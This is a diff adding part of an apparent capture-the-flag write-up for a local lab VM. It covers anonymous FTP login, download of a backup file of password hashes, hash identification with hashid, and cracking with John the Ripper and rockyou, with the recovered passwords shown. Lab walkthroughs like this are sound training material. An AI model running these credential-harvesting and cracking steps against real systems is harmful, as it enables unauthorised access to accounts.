@@ -43,3 +43,58 @@ PORT     STATE  SERVICE    VERSION
 MAC Address: 08:00:27:D3:CE:C3 (Oracle VirtualBox virtual NIC)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
+
+the only ports are `21` and `22`, so let's check ftp first :
+
+we are able to connect to ftp via user `anonymous` :
+
+```bash
+tp 192.168.56.119                                    
+Connected to 192.168.56.119.
+220 pyftpdlib 1.5.5 ready.
+Name (192.168.56.119:root): anonymous
+331 Username ok, send password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+
+ftp> dir
+229 Entering extended passive mode (|||41299|).
+125 Data connection already open. Transfer starting.
+-rw-r--r--   1 root     root         1062 Jul 29  2019 backup
+
+ftp> get backup
+local: backup remote: backup
+229 Entering extended passive mode (|||36815|).
+125 Data connection already open. Transfer starting.
+100% |******************************************************************************************|  1062      179.86 KiB/s    00:00 ETA
+226 Transfer complete.
+```
+
+inside backup file we see this 5 hashes, because it is some how not in a good format
+
+i just copied and paste each line in a new file call `user.txt`, the hash type can be identified with `hashid` :
+
+```bash
+root@kali: hashid -mj '$6$$3QW/J4OlV3naFDbhuksxRXLrkR6iKo4gh.Zx1RfZC2OINKMiJ/6Ffyl33OFtBvCI7S4N1b8vlDylF2hG2N0NN/'
+
+Analyzing '$6$$3QW/J4OlV3naFDbhuksxRXLrkR6iKo4gh.Zx1RfZC2OINKMiJ/6Ffyl33OFtBvCI7S4N1b8vlDylF2hG2N0NN/'
+[+] SHA-512 Crypt [Hashcat Mode: 1800][JtR Format: sha512crypt]
+```
+
+just use `john` to crack the password :
+
+```bash
+root@kali: john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt user.txt 
+
+Using default input encoding: UTF-8
+Loaded 5 password hashes with 2 different salts (2.5x same-salt boost) (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+space            (space)     
+cheer14          (sunset)     
+sky              (sky)  
+```
+
